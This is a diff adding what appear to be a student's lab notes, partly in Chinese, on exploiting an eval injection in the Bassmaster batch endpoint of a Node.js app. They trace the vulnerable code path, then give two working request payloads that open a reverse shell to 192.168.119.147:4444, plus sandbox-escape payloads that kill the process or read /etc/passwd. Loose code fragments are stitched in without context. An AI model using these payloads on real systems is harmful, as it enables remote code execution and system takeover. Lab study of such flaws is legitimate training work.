@@ -1,0 +1,24 @@
+ssh student@bassmaster
+
+
+
+
+1.在工程目錄下查找js執行code的方法eval
+grep -rnw "eval(" . --color 搜索任何執行code的js代碼
+2.找到batch.js的152行有eval執行code
+3.該行代碼是屬於137行的internals.batch方法裡面
+4.發現方法internals.process內的第88行會執行方法internals.batch
+5.發現internals.process內的85行定義了變數callBatch會執行internals.batch
+
+
+{'method': 'get', 'path': "/item/$1.id;var net = require('net'),sh = require('child_process').exec('\\\\x2fbin\\\\x2fbash');var client = new net.Socket(); client.connect(4444, '192.168.119.147' ,function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});"}
+{"method":"get","path":"   /item/$1.id;var net = require('net'),sh = require('child_process').exec('\\x2fbin\\x2fbash');    var client = new net.Socket(); client.connect(4444, '192.168.119.147', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});"}
+value = ref.' + parts[i].value + ';');
+
+console.log('Executing: ' + parts[i].value);
+
+retest": "node_modules/standard/bin/cmd.js",
+"test": "node_modules/mocha/bin/mocha test"
+safeEval("this.constructor.constructor('return process')().exit()");
+
+const xyz = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()`);
